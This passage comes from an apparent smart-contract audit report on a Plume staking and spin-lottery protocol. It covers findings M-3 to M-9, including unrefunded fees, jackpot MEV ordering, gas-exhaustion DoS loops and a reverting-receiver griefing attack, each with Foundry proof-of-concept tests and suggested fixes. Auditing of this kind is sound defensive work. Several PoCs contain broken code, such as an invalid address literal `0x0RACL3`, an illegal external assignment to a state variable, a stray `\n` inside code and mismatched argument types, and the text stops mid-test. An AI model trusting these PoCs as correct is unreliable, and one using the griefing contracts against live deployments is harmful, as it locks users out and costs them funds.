// Mock SupraRouter that can be configured to not call back
contract MockSupraRouter is ISupraRouterContract {
    mapping(uint256 => bool) public shouldCallback;
    uint256 public nonceCounter;

    function generateRequest(
        string memory, uint8, uint256, uint256, address
    ) external returns (uint256) {
        nonceCounter++;
        // In this test, we assume it doesn't call back
        return nonceCounter;
    }
}

contract DosTest is Test {
    Spin spin;
    MockSupraRouter mockRouter;
    address admin = makeAddr("admin");
    address user = makeAddr("user");
    address dateTime = makeAddr("dateTime");

    function setUp() public {
        vm.prank(admin);
        mockRouter = new MockSupraRouter();
        vm.prank(admin);
        spin = new Spin();
        vm.prank(admin);
        spin.initialize(address(mockRouter), dateTime);
        vm.prank(admin);
        spin.setEnableSpin(true);
    }

    function test_Dos_StuckSpinAndFundLoss() public {
        uint256 spinPrice = spin.spinPrice();
        vm.deal(user, spinPrice);

        // 1. User calls startSpin
        vm.prank(user);
        spin.startSpin{value: spinPrice}();

        assertTrue(spin.isSpinPending(user), "User spin should be pending");
        assertEq(address(spin).balance, spinPrice, "Spin contract should hold the fee");

        // 2. Oracle does not call back. User tries to spin again.
        vm.prank(user);
        vm.expectRevert(abi.encodeWithSelector(Spin.SpinRequestPending.selector, user));
        spin.startSpin{value: spinPrice}();

        // 3. Admin cancels the pending spin
        vm.prank(admin);
        spin.cancelPendingSpin(user);

        assertFalse(spin.isSpinPending(user), "User spin should no longer be pending");

        // 4. Check balances. User has lost their fee.
        assertEq(address(user).balance, 0, "User should have lost the spin fee");
        assertEq(address(spin).balance, spinPrice, "Spin contract still holds the fee");
    }
}

```

## Suggested Mitigation
Store the exact fee paid at the time of the request and refund that value:

```solidity
// 1.  State
mapping(address => uint256) private pendingSpinFee;

// 2.  startSpin()
...
pendingSpinFee[msg.sender] = msg.value; // save exact amount sent
...

// 3.  cancelPendingSpin()
function cancelPendingSpin(address user) external onlyRole(ADMIN_ROLE) nonReentrant {
    require(isSpinPending[user], "No spin pending for this user");

    uint256 nonce = pendingNonce[user];
    if (nonce != 0) delete userNonce[nonce];

    uint256 fee = pendingSpinFee[user];
    delete pendingSpinFee[user];
    delete pendingNonce[user];
    isSpinPending[user] = false;

    // refund exact fee
    _safeTransferPlume(payable(user), fee);
}
```
This ensures the user is made whole even if `spinPrice` is later updated and prevents over- or under-payment. Consider adding a `userCancelPendingSpin()` that lets the user trigger the refund themselves after a grace period to remove the admin availability requirement.

## [M-3]. Frontrun/Backrun/Sandwhich MEV issue in Spin::handleRandomness

## Description
The function `handleRandomness` determines the weekly jackpot winner based on a "first-come, first-served" basis. When a user's spin results in a jackpot win, the state variable `lastJackpotClaimWeek` is updated. If two or more oracle callbacks for potential jackpot winners are processed in the same block, a miner or block builder can choose the execution order. By ordering the transactions, the builder can decide who wins the jackpot for that week, creating a significant MEV opportunity and undermining the fairness of the game.

## Impact
The integrity of the jackpot mechanism is compromised. The winner is not determined purely by luck but can be influenced or directly chosen by a malicious block builder. This can lead to a loss of user trust and potential value extraction by miners/validators.

## Proof of Concept
1. `lastJackpotClaimWeek` is set to a week prior to the `currentWeek`.
2. Alice and Bob both spin, and the VRF oracle determines both are eligible for the jackpot this week.
3. The oracle submits two transactions to the mempool: `handleRandomness(alice_nonce, ...)` and `handleRandomness(bob_nonce, ...)`.
4. A MEV searcher or malicious block builder sees both transactions. They can construct a block where their preferred winner's transaction (e.g., Alice's) is executed first.
5. Alice's transaction runs, she is awarded the jackpot, and `lastJackpotClaimWeek` is updated to `currentWeek`.
6. Bob's transaction runs second. The check `if (currentWeek == lastJackpotClaimWeek)` now evaluates to true, causing Bob's reward to be downgraded to "Nothing". The block builder has successfully chosen the winner.

## Proof of Code
```solidity
// This vulnerability is about transaction ordering by a miner/builder and is difficult to demonstrate
// in a standard Foundry test where the tester controls execution order. 
// The POC below conceptually illustrates the logic that enables the vulnerability.

// Conceptual Test Logic:
// 1. Setup two users, Alice and Bob.
// 2. Simulate oracle callbacks for both Alice and Bob arriving in the same block, both with jackpot-winning randomness.
// 3. First, execute the callback for Alice. She wins the jackpot. Assert her jackpot win.
// 4. Second, execute the callback for Bob in the same simulated block time. He does not win the jackpot because `lastJackpotClaimWeek` was set by Alice's transaction. Assert he gets 'Nothing'.
// 5. Reverse the order: execute Bob's callback first, then Alice's. Now Bob wins and Alice does not. This demonstrates that the winner is determined by ordering.
```

## Suggested Mitigation
A robust solution would involve a significant redesign, such as a commit-reveal scheme or a weekly aggregation of all jackpot-eligible spins followed by a single drawing. A simpler, though less perfect, mitigation is to use the VRF randomness as a tie-breaker. Instead of the first one winning, the user with the 'best' random number (e.g., the lowest value) from the jackpot-winning range could be declared the winner at the end of the week. This would require storing potential winners and having a process to finalize the result after the week ends, which is still a major change. Acknowledging this as a known risk of the first-come-first-served design might be the only option without a redesign.

## [M-4]. DOS issue in ValidatorFacet::_cleanupExpiredVotes

## Description
The internal function `_cleanupExpiredVotes` iterates through `$.validatorIds`, which is an array containing all validators in the system, to clean up expired slash votes for a single target validator. This function's gas cost scales linearly with the total number of validators. This function is called within `voteToSlashValidator` and `slashValidator`, which are critical security functions for punishing malicious actors. If the system grows to have a large number of validators (e.g., thousands), the gas cost to execute `_cleanupExpiredVotes` could exceed the block gas limit, causing any transaction that calls it to fail. This would make it impossible to cast new slash votes or to execute a successful slash, effectively disabling the slashing mechanism and removing a key economic deterrent against validator misbehavior.

## Impact
Because _cleanupExpiredVotes iterates over the whole validatorIds array, the cost of voteToSlashValidator / slashValidator grows linearly with the number of validators. Once the array is large enough the call will run out-of-gas and revert, making it impossible to create new slash-votes or to execute an already-reached consensus. The protocol therefore loses its on-chain punishment mechanism, removing an important economic deterrent, but no user funds are directly lost or frozen.

## Proof of Concept
Deploy the system, register tens of thousands of validators (or keep adding until gas usage is close to the block-gas-limit), then try

voteToSlashValidator(<targetId>, block.timestamp + 1 days)

and observe the transaction run out-of-gas.  A quick way to reproduce inside a forked test-net is to:

1.  vm.txGasLimit(5_000_000);   // artificially low block limit
2.  loop-add 3 000 validators (their creation is cheap because it is done in the same transaction of the test and Forge has no gas limit while preparing state).
3.  Call voteToSlashValidator from another validator admin – the call reverts with OOG because _cleanupExpiredVotes performs 3 000×SLOAD plus logic which exceeds the imposed gas limit.

## Proof of Code
pragma solidity ^0.8.25;

import {PlumeStakingDiamondTest} from "test/PlumeStakingDiamond.t.sol";

contract ValidatorDosTest is PlumeStakingDiamondTest {
    uint16 constant NUM = 3000;

    function test_cleanupExpiredVotes_outOfGas() public {
        // give a smaller block gas limit so we can observe OOG inside Forge
        vm.txGasLimit(5_000_000);

        address mgr = makeAddr("mgr");
        vm.prank(owner);
        accessControlFacet.grantRole(PlumeRoles.VALIDATOR_ROLE, mgr);

        // populate many validators
        for (uint16 i = 1; i <= NUM; i++) {
            address a = address(uint160(uint256(keccak256(abi.encode(i)))));
            vm.prank(mgr);
            validatorFacet.addValidator(i, 1e16, a, a, "", "", address(0), 1e24);
        }

        // target + voter
        uint16 target = NUM + 1;
        uint16 voter  = NUM + 2;
        address targetAdmin = makeAddr("tgt");
        address voterAdmin  = makeAddr("vtr");
        vm.prank(mgr);
        validatorFacet.addValidator(target, 1e16, targetAdmin, targetAdmin, "", "", address(0), 1e24);
        vm.prank(mgr);
        validatorFacet.addValidator(voter, 1e16, voterAdmin, voterAdmin, "", "", address(0), 1e24);

        // voter must stake so that he is considered active (simplified)
        vm.deal(voterAdmin, 1 ether);
        vm.prank(voterAdmin);
        stakingFacet.stake{value:1 ether}(voter);

        // set vote duration parameters
        vm.prank(owner);
        managementFacet.setMaxSlashVoteDuration(1 days);

        vm.prank(voterAdmin);
        vm.expectRevert(); // out-of-gas inside the EVM
        validatorFacet.voteToSlashValidator(target, block.timestamp + 1 hours);
    }
}

## Suggested Mitigation
Store, for every slash proposal, an array (or mapping+array) of voter validatorIds instead of iterating over the global validatorIds array.  _cleanupExpiredVotes would then iterate only over voters that actually cast a vote, making its cost O(number_of_voters) and independent of total validator count.

## [M-5]. Oracle issue in Spin::handleRandomness

## Description
The `handleRandomness` function processes the random number callback from the Supra oracle. It directly accesses the first element of the `rngList` array via `rngList[0]` without first validating that the array is not empty. If the Supra oracle, due to a bug or misconfiguration, were to send an empty array, this operation would cause the transaction to revert with an out-of-bounds error.

This revert has serious consequences for the user whose spin is being processed. The user's state remains pending (`isSpinPending` is true), which prevents them from initiating a new spin. The admin must manually intervene by calling `cancelPendingSpin` to unblock the user. Crucially, the `cancelPendingSpin` function does not refund the user's spin fee. Therefore, a reverting oracle callback leads to a direct and irreversible loss of funds for the user.

## Impact
A reverting oracle callback causes a temporary denial of service for the affected user (they cannot spin again until an admin intervenes) and a permanent loss of their paid spin fee. This can be exploited to grief users if the oracle's behavior can be influenced.

## Proof of Concept
1. Alice calls `startSpin()` and pays the `spinPrice` (e.g., 2 PLUME). Her `isSpinPending` status is set to `true` and a nonce is generated for her request.
2. The Supra oracle (or a malicious entity with the `SUPRA_ROLE`) calls `handleRandomness` with Alice's `nonce` but an empty `uint256[]` for `rngList`.
3. The `handleRandomness` transaction reverts when it tries to access `rngList[0]`.
4. Because the transaction reverted, Alice's state is not cleaned up. `isSpinPending` is still `true`.
5. Alice tries to call `startSpin()` again but the call reverts because she has a pending spin.
6. An admin calls `cancelPendingSpin(Alice)` to fix her state.
7. Alice is now unblocked, but her 2 PLUME spin fee has been kept by the contract and is not refunded.

## Proof of Code
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Spin} from "../src/spin/Spin.sol";
import {ISupraRouterContract} from "../src/interfaces/ISupraRouterContract.sol";

contract MockSupraRouter is ISupraRouterContract {
    uint256 public nonceCounter;
    address public spinContract;
    function generateRequest(string calldata, uint8, uint256, uint256, address) external returns (uint256) {
        nonceCounter++;
        return nonceCounter;
    }
    function triggerEmptyCallback(uint256 nonce) external {
        uint256[] memory emptyRngList;
        Spin(spinContract).handleRandomness(nonce, emptyRngList);
    }
}

contract MockDateTime { 
    function getDay(uint256) public pure returns (uint8) { return 1; }
    function getYear(uint256) public pure returns (uint16) { return 2024; }
    function getMonth(uint256) public pure returns (uint8) { return 1; }
}

contract SpinOracleTest is Test {
    Spin public spin;
    MockSupraRouter public mockRouter;
    MockDateTime public mockDateTime;
    address public admin = address(1);
    address public user = address(2);

    function setUp() public {
        vm.prank(admin);
        mockDateTime = new MockDateTime();
        
        vm.prank(admin);
        spin = new Spin();
        
        mockRouter = new MockSupraRouter();
        mockRouter.spinContract = address(spin);

        vm.prank(admin);
        spin.initialize(address(mockRouter), address(mockDateTime));

        bytes32 SUPRA_ROLE = spin.SUPRA_ROLE();
        vm.prank(admin);
        spin.grantRole(SUPRA_ROLE, address(mockRouter));

        vm.deal(user, 10 ether);
        vm.deal(address(spin), 100 ether); // For rewards

        vm.prank(admin);
        spin.setCampaignStartDate(block.timestamp);
        vm.prank(admin);
        spin.setEnableSpin(true);
    }

    function test_OracleCallbackRevert_LosesUserFee() public {
        // 1. User starts a spin
        uint256 spinPrice = spin.spinPrice();
        vm.prank(user);
        spin.startSpin{value: spinPrice}();

        uint256 userBalanceBefore = user.balance;
        uint256 nonce = spin.pendingNonce(user);
        assertTrue(spin.isSpinPending(user), "Spin should be pending");

        // 2. Oracle calls back with an empty RNG list, which should revert
        vm.prank(address(mockRouter));
        vm.expectRevert(); // Reverts on array out-of-bounds
        mockRouter.triggerEmptyCallback(nonce);

        // 3. Verify user is still stuck in a pending state
        assertTrue(spin.isSpinPending(user), "User should still be pending after revert");
        vm.prank(user);
        vm.expectRevert(abi.encodeWithSelector(Spin.SpinRequestPending.selector, user));
        spin.startSpin{value: spinPrice}();

        // 4. Admin cancels the pending spin
        vm.prank(admin);
        spin.cancelPendingSpin(user);

        // 5. Verify user state is reset, but fee was not returned
        assertFalse(spin.isSpinPending(user), "User should not be pending after cancellation");
        assertEq(user.balance, userBalanceBefore, "User fee was not refunded");
        console.log("User lost spin fee of:", spinPrice);
    }
}

## Suggested Mitigation
Inside handleRandomness, convert the empty-array case into a non-reverting branch that cleans up state and refunds the user:

```solidity
function handleRandomness(uint256 nonce, uint256[] memory rngList) external onlyRole(SUPRA_ROLE) nonReentrant {
    address payable user = userNonce[nonce];
    if (user == address(0)) revert InvalidNonce();

    // always clear pending-spin bookkeeping first so the user cannot be grief-locked
    isSpinPending[user] = false;
    delete userNonce[nonce];
    delete pendingNonce[user];

    // If oracle delivered no randomness, treat it as a failed request — refund and exit.
    if (rngList.length == 0) {
        _safeTransferPlume(user, spinPrice); // give back the fee
        emit SpinCompleted(user, "Nothing", 0);
        return; // graceful exit, no revert
    }

    uint256 currentSpinStreak = _computeStreak(user, block.timestamp, true);
    uint256 randomness = rngList[0];
    (string memory rewardCategory, uint256 rewardAmount) = determineReward(randomness, currentSpinStreak);
    ... // existing reward logic
}
```

This approach guarantees:
1. The transaction never reverts because of an empty list.
2. The user’s pending lock is cleared so they can spin again.
3. Their spin fee is returned, preventing permanent loss and economic grief.

Any other edge-case handling (e.g., awarding a default “Nothing” without refund) is acceptable as long as it does **not** revert and does **unlock** the user.

## [M-6]. DOS issue in Spin::_safeTransferPlume

## Description
The `_safeTransferPlume` function, which is called from `handleRandomness` to distribute native token (PLUME) rewards, uses a raw `.call`. If the recipient is a contract, it can have a `receive()` function that deliberately reverts. This will cause the entire `handleRandomness` transaction, which is executed by the trusted Supra oracle, to revert. As a result, the user's spin state is not cleaned up (`isSpinPending` remains true, `userNonce` and `pendingNonce` are not deleted), effectively locking them out of future spins. The only way to resolve this is through a manual, privileged call to `cancelPendingSpin` by an admin. The user who initiated the spin loses their spin fee and the potential reward.

## Impact
A malicious user can cause their own spin transaction to be perpetually stuck in a pending state, requiring manual admin intervention to resolve. This attack costs the user their spin fee but can be used to disrupt the normal operation of the protocol by creating a backlog of stuck requests for the admin to handle. This constitutes a griefing attack that leverages the trusted oracle's transaction.

## Proof of Concept
1. An attacker deploys a contract (`MaliciousWinner`) with a `receive()` function that always reverts.
2. The `MaliciousWinner` contract calls `Spin.startSpin()` and pays the fee.
3. A trusted oracle (simulated in the PoC) is configured to return a random number that results in a PLUME token win for the `MaliciousWinner`.
4. The oracle calls `Spin.handleRandomness()`.
5. The `handleRandomness` function proceeds to call `_safeTransferPlume` to send the reward to `MaliciousWinner`.
6. The transfer triggers `MaliciousWinner.receive()`, which reverts.
7. The entire `handleRandomness` transaction reverts, and all state changes within it are undone.
8. The `isSpinPending` flag for `MaliciousWinner` remains `true`, preventing it from calling `startSpin()` again.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Spin} from "../src/spin/Spin.sol";
import {IDateTime} from "../src/interfaces/IDateTime.sol";

// ---------------- Mock Contracts ----------------
contract MockSupraRouter {
    address public spinContract;
    uint256 public nextNonce = 1;

    constructor(address _spinContract) {
        spinContract = _spinContract;
    }

    function generateRequest(
        string memory, uint8, uint256, uint256, address
    ) external returns (uint256) {
        return nextNonce++;
    }

    function fulfillRandomness(uint256 nonce, uint256[] memory rngList) external {
        Spin(spinContract).handleRandomness(nonce, rngList);
    }
}

contract MockDateTime is IDateTime {
    function isLeapYear(uint16) external pure returns (bool) { return false; }
    function leapYearsBefore(uint256) external pure returns (uint256) { return 0; }
    function getDaysInMonth(uint8, uint16) external pure returns (uint8) { return 30; }
    function getYear(uint256 ts) external pure returns (uint16) { return uint16(1970 + ts / 31536000); }
    function getMonth(uint256) external pure returns (uint8) { return 1; }
    function getDay(uint256 ts) external pure returns (uint8) { return uint8(1 + (ts % 31536000) / 86400); }
    function getHour(uint256) external pure returns (uint8) { return 0; }
    function getMinute(uint256) external pure returns (uint8) { return 0; }
    function getSecond(uint256) external pure returns (uint8) { return 0; }
    function getWeekday(uint256) external pure returns (uint8) { return 0; }
    function toTimestamp(uint16, uint8, uint8, uint8, uint8, uint8) external pure returns (uint256) { return 0; }
}

// Malicious recipient that reverts on receiving ETH
contract MaliciousWinner {
    Spin public spinContract;

    constructor(address _spinContract) {
        spinContract = Spin(_spinContract);
    }

    function attack() external payable {
        spinContract.startSpin{value: msg.value}();
    }

    receive() external payable {
        revert("Haha, I revert!");
    }
}

// ---------------------- Test ----------------------
contract SpinDosTest is Test {
    Spin spin;
    MockSupraRouter supraRouter;
    MockDateTime dateTime;

    address admin = address(0xA11CE);
    address oracleNode = address(0x0RACL3);

    function setUp() public {
        vm.startPrank(admin);
        spin = new Spin();
        supraRouter = new MockSupraRouter(address(spin));
        dateTime = new MockDateTime();
        spin.initialize(address(supraRouter), address(dateTime));
        spin.grantRole(spin.SUPRA_ROLE(), oracleNode); // optional extra oracle address
        spin.setEnableSpin(true);
        spin.setCampaignStartDate(block.timestamp);
        vm.stopPrank();
    }

    function test_RevertingRecipientKeepsSpinPending() public {
        // Deploy attacker
        MaliciousWinner attacker = new MaliciousWinner(address(spin));
        uint256 fee = spin.spinPrice();

        vm.deal(address(attacker), fee);
        vm.prank(address(attacker));
        attacker.attack{value: fee}();

        uint256 nonce = spin.pendingNonce(address(attacker));
        assertGt(nonce, 0);
        assertTrue(spin.isSpinPending(address(attacker)));

        // RNG that yields a Plume Token win so ETH transfer is triggered
        uint256[] memory rng = new uint256[](1);
        rng[0] = 1;

        // Entire callback reverts due to malicious receiver
        vm.expectRevert(bytes("Plume transfer failed"));
        supraRouter.fulfillRandomness(nonce, rng);

        // Spin still marked as pending
        assertTrue(spin.isSpinPending(address(attacker)));

        // Attacker cannot spin again
        vm.deal(address(attacker), fee);
        vm.prank(address(attacker));
        vm.expectRevert(abi.encodeWithSelector(Spin.SpinRequestPending.selector, address(attacker)));
        attacker.attack{value: fee}();
    }
}

## Suggested Mitigation
To prevent the entire callback transaction from reverting, the external call for transferring rewards should be wrapped in a `try/catch` block. If the transfer fails, the contract can emit an event logging the failure and continue execution, ensuring the user's spin state is properly finalized. While the user would not receive their reward, the protocol would not enter a stuck state requiring admin intervention.

```solidity
// In Spin.sol

function _safeTransferPlume(address payable _to, uint256 _amount) internal {
    require(address(this).balance >= _amount, "insufficient Plume in the Spin contract");
    (bool success, ) = _to.call{value: _amount}("");
    require(success, "Plume transfer failed");
}

// Suggested change in handleRandomness function
function handleRandomness(uint256 nonce, uint256[] memory rngList) external onlyRole(SUPRA_ROLE) nonReentrant {
    // ... (existing logic before transfer)

    // ----------  Interactions: transfer Plume last ----------
    if (
        keccak256(bytes(rewardCategory)) == keccak256("Jackpot") ||
        keccak256(bytes(rewardCategory)) == keccak256("Plume Token")
    ) {
        try this._safeTransferPlume(user, rewardAmount * 1 ether) {
            // Success
        } catch {
            // Failure, emit an event to notify about the failed transfer
            emit RewardTransferFailed(user, rewardCategory, rewardAmount);
        }
    }

    emit SpinCompleted(user, rewardCategory, rewardAmount);
}
```

## [M-7]. DOS issue in RewardsFacet::_processAllValidatorRewards

## Description
The `claim(address token)` and `claimAll()` functions iterate over all validators a user has staked with to calculate and process rewards. This is done within the `_processAllValidatorRewards` internal function. If a user stakes with a large number of validators, the gas cost of this loop can exceed the block gas limit. This would cause the transaction to fail, making it impossible for the user to claim their accrued rewards. Since there is no limit on how many validators a user can stake with, a user can unintentionally or maliciously (by an attacker staking on their behalf if `stakeOnBehalf` exists in another facet) get into a state where their rewards are permanently frozen.

Vulnerable Code Snippet from `_processAllValidatorRewards`:
```solidity
function _processAllValidatorRewards(address user, address token) internal returns (uint256 totalReward) {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();

    uint16[] memory validatorIds = $.userValidators[user];

    for (uint256 i = 0; i < validatorIds.length; i++) {
        uint16 validatorId = validatorIds[i];

        // ... does significant state updates inside
        uint256 rewardFromValidator = _processValidatorRewards(user, validatorId, token);
        totalReward += rewardFromValidator;
    }

    return totalReward;
}
```
The `claim(address token, uint16 validatorId)` function is not affected, but it would require the user to send a separate transaction for each validator, which is extremely inefficient and costly, defeating the purpose of the batch claim functions.

## Impact
A user who has staked with hundreds of validators will find that the convenience functions claim(token) and claimAll() revert with out-of-gas, effectively DOS-ing those paths. Rewards are not lost, but the user must send one transaction per validator to recover them, making claiming prohibitively expensive and opening grief-style attacks if an adversary stakes on the user’s behalf.

## Proof of Concept
1. Deploy RewardsFacetHarness below.
2. From an EOA add 300 validators and 1 reward token.
3. Warp time so rewards accrue.
4. Call claim(token) with 5M gas – the call reverts because the loop (300 iterations × heavy state writes) exhausts gas.

// Solidity snippet
RewardsFacetHarness h = new RewardsFacetHarness();
address user = vm.addr(1);
address reward = address(0xBEEF);

// set reward token
h.addRewardTokenMock(reward);

// create many validators + stake for user
for (uint16 i = 1; i <= 300; i++) {
    h.forceAddStake(user, i);
}

// accrue
vm.warp(block.timestamp + 1 days);

// expect revert due to gas exhaustion (supply restrictive gas)
(bool ok,) = address(h).call{gas: 5_000_000}(abi.encodeWithSignature("claim(address)", reward));
assert(!ok);

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {RewardsFacet} from "../src/facets/RewardsFacet.sol";
import {PlumeStakingStorage} from "../src/lib/PlumeStakingStorage.sol";

contract RewardsFacetHarness is RewardsFacet {
    /* helper to mint stake and validator data */
    function forceAddStake(address user, uint16 validatorId) external {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        $.validatorExists[validatorId] = true;
        $.validators[validatorId].active = true;
        $.userValidators[user].push(validatorId);
        $.userValidatorStakes[user][validatorId].staked = 1 ether;
        $.validatorTotalStaked[validatorId] = 1 ether;
    }
    function addRewardTokenMock(address token) external {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        $.isRewardToken[token] = true;
        $.rewardRates[token] = 1e18; // 1 token / sec
    }
}

contract RewardsGasDosTest is Test {
    RewardsFacetHarness h;
    address user;
    address reward = address(0xBEEF);
    uint16 constant COUNT = 300;

    function setUp() public {
        h = new RewardsFacetHarness();
        user = address(0xA11CE);
        h.addRewardTokenMock(reward);
        for (uint16 i = 1; i <= COUNT; i++) {
            h.forceAddStake(user, i);
        }
        vm.warp(block.timestamp + 2 days); // accrue rewards
    }

    function testGasDos() public {
        // supply limited gas so we can observe failure deterministically
        vm.prank(user);
        (bool ok,) = address(h).call{gas: 5_000_000}(abi.encodeWithSignature("claim(address)", reward));
        assertFalse(ok, "claim unexpectedly succeeded – increase COUNT");
    }
}

## Suggested Mitigation
Introduce a paginated version of claim that accepts (token, start, end) or allow users to pass an array of validatorIds to process in a single transaction. The existing claim() / claimAll() should either be removed or internally enforce a hard cap on iterations (e.g., max 100 validators) and emit an error instructing users to use the paginated version.

## [M-8]. DOS issue in ValidatorFacet::voteToSlashValidator

## Description
Several functions within the `ValidatorFacet` contract utilize loops that iterate through the entire list of registered validators (`$.validatorIds`). The gas cost of these loops is directly proportional to the total number of validators in the system. As the number of validators grows, the gas required to execute these functions can exceed the block gas limit, leading to a Denial of Service (DoS) condition. This vulnerability is particularly critical in the slashing mechanism. Functions like `voteToSlashValidator` and `slashValidator` rely on these loops to verify voting eligibility and clean up expired votes. If these functions become inoperable due to high gas costs, the protocol's ability to punish and remove malicious validators is compromised.

The following functions contain or rely on unbounded loops over the validator set:
- `_cleanupExpiredVotes` (and its public wrapper `cleanupExpiredVotes`)
- `_countActiveValidators`
- `_performSlash`
- `getSlashVoteCount`
- `voteToSlashValidator`
- `slashValidator`

The most critical vulnerability path is through `voteToSlashValidator`, which calls `_cleanupExpiredVotes`:

```solidity
// contracts/plume/src/facets/ValidatorFacet.sol:765-802

    function _cleanupExpiredVotes(
        uint16 validatorId
    ) internal returns (uint256 newActiveVoteCount) {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();

        uint256 voteCount = $.slashVoteCounts[validatorId];
        if (voteCount == 0) {
            return 0; // No votes to clean up
        }

        uint16[] memory allValidatorIds = $.validatorIds; // Unbounded array read
        uint256 newActiveVoteCount = 0;

        for (uint256 i = 0; i < allValidatorIds.length; i++) { // Unbounded loop
            uint16 voterValidatorId = allValidatorIds[i];
            if (voterValidatorId == validatorId) {
                continue;
            }
            // ... logic ...
        }

        // ... logic ...
    }
```

This makes the core security function of slashing unreliable and susceptible to DoS as the protocol scales.

## Impact
Because every vote-related function iterates over the full validator array, their gas consumption grows linearly with the number of validators.  Once the array is large enough the transaction will inevitably run out of gas and revert, making it **permanently impossible** to cast new slash-votes or to execute `slashValidator`.  A malicious validator would therefore become slash-immune, breaking the protocol’s security assumptions and leaving user funds exposed to further attacks.

## Proof of Concept
1. Obtain `VALIDATOR_ROLE` (or have admin privileges).
2. Register ~2,000 validators (fits comfortably below 65 k `uint16` limit).
3. Have any of those new validator admins cast a slash vote.  
4. Call the next vote with a transaction gas-limit of 5 000 000 gas.
5. The call reverts with an out-of-gas error because `_cleanupExpiredVotes()` iterates over the 2 000 element array and the body of the loop performs several SLOAD/SSTORE operations each round (~20 k gas/iteration).
6. Since every future call to `voteToSlashValidator` or `slashValidator` triggers `_cleanupExpiredVotes`, slashing is bricked until a contract upgrade.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {PlumeStakingDiamond} from "../PlumeStakingDiamond.t.sol";
import {ValidatorFacet}        from "../../src/facets/ValidatorFacet.sol";
import {AccessControlFacet}    from "../../src/facets/AccessControlFacet.sol";
import {PlumeRoles}            from "../../src/lib/PlumeRoles.sol";

// Helper that gives each validator a unique admin address
contract DummyAdmin {
    constructor(uint256) {}
}

contract SlashVote_GasDoS is PlumeStakingDiamond {
    function setUp() public override {
        super.setUp();
        // test contract already owns DEFAULT_ADMIN_ROLE, grant itself VALIDATOR_ROLE
        accessControlFacet.grantRole(PlumeRoles.VALIDATOR_ROLE, address(this));
    }

    function _addManyValidators(uint16 n) internal {
        for (uint16 i = 0; i < n; i++) {
            address admin = address(new DummyAdmin(i));
            validatorFacet.addValidator({
                validatorId: i + 1,
                commission: 0,
                l2AdminAddress: admin,
                l2WithdrawAddress: admin,
                l1ValidatorAddress: "val",
                l1AccountAddress: "acc",
                l1AccountEvmAddress: admin,
                maxCapacity: 1_000 ether
            });
        }
    }

    function test_voteRunsOutOfGas() public {
        uint16 total = 2000; // big enough to exceed 5 M gas in cleanup loop
        _addManyValidators(total);

        uint16 malicious = 1;
        uint16 voterId  = 2;
        address voterAdmin = validatorFacet.getValidatorInfo(voterId).l2AdminAddress;

        // cast first vote successfully (unlimited gas)
        vm.prank(voterAdmin);
        validatorFacet.voteToSlashValidator(malicious, block.timestamp + 1 days);

        // next vote will trigger _cleanupExpiredVotes again – set a low tx gas-limit
        vm.txGasLimit(5_000_000);
        vm.expectRevert();               // any revert → OOG counts
        vm.prank(voterAdmin);
        validatorFacet.voteToSlashValidator(malicious, block.timestamp + 2 days);
    }
}

## Suggested Mitigation
Replace full-array scans with data-structures of bounded size:
1. Maintain `activeValidatorCount` that is incremented/decremented on status changes instead of walking the array.
2. Keep, per target validator, an *array of voterIds that actually voted* and iterate only over that list when cleaning up.
3. If historical data must be pruned, let anyone call a cheap `checkpoint` function that rolls expired votes forward.
These changes give O(1) or O(V) (where V is votes, not validators) gas cost and remove the DoS vector.

## [M-9]. DOS issue in RewardsFacet::addRewardToken

## Description
The administrative functions `addRewardToken` and `setRewardRates` in `RewardsFacet` iterate over all active validators to create or update reward rate checkpoints. The gas cost of these functions scales linearly with the number of active validators in the system.

```solidity
// in RewardsFacet.sol
function addRewardToken(...) external onlyRole(REWARD_MANAGER_ROLE) {
    // ...
    PlumeStakingStorage.Layout storage s = PlumeStakingStorage.layout();
    uint16[] memory validatorIds = s.validatorList;
    for (uint256 i = 0; i < validatorIds.length; i++) { // Unbounded loop
        uint16 validatorId = validatorIds[i];
        if (s.validators[validatorId].active) {
            _createRewardRateCheckpoint(s, validatorId, token, initialRate);
        }
    }\n    // ...
}
```

If the number of validators grows significantly (e.g., into the hundreds or thousands), the gas cost for these functions could exceed the block gas limit. This would cause the transactions to fail, preventing the `REWARD_MANAGER_ROLE` from adding new reward tokens or updating rates, thereby crippling a core component of the protocol's incentive mechanism.

## Impact
A high number of validators could render the reward management system unusable. The inability to add new reward tokens or adjust emission rates would be a major operational failure, potentially breaking partnerships and disrupting the protocol's tokenomics. This represents a significant scaling bottleneck that evolves into a denial-of-service vulnerability.

## Proof of Concept
Deploy PlumeStakingDiamond with the RewardsFacet. Create N (~600+) active validators so the loop inside RewardsFacet.addRewardToken performs >600 iterations. Then attempt to add a reward token via a low-level call that forwards a limited amount of gas (e.g. 5 000 000). The call will run out of gas and return false, demonstrating that once the validator set is large enough the REWARD_MANAGER_ROLE cannot perform the action any more.

Pseudo steps:
1. addValidator(...) in a loop until validatorList.length == 600.
2. bytes memory data = abi.encodeWithSelector(RewardsFacet.addRewardToken.selector, PLUME_NATIVE, 1e18, 2e18);
3. bool success = address(rewardsFacet).call{gas: 5_000_000}(data);
4. success == false → gas-exhaustion DoS proven.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {PlumeStakingDiamondTest} from "../PlumeStakingDiamond.t.sol";

contract GasDoSRewardFacetTest is PlumeStakingDiamondTest {
    function test_DoS_When_Many_Validators() public {
        uint16 numValidators = 600;
        for (uint16 i = 1; i <= numValidators; i++) {
            validatorFacet.addValidator(
                i,
                0,                         // commission
                address(uint160(i)),        // l2Admin
                address(uint160(i + 1)),    // l2Withdraw
                address(uint160(i + 2)),    // l1Val
                address(uint160(i + 3)),    // l1Acc
                bytes32(uint256(i + 4)),    // l1AccEvm
                1_000 ether                 // maxCapacity
            );
        }

        uint256 activeValidators = validatorFacet.getActiveValidatorCount();
        assertEq(activeValidators, numValidators);

        // Prepare calldata for addRewardToken
        bytes memory data = abi.encodeWithSelector(
            rewardsFacet.addRewardToken.selector,
            PLUME_NATIVE,
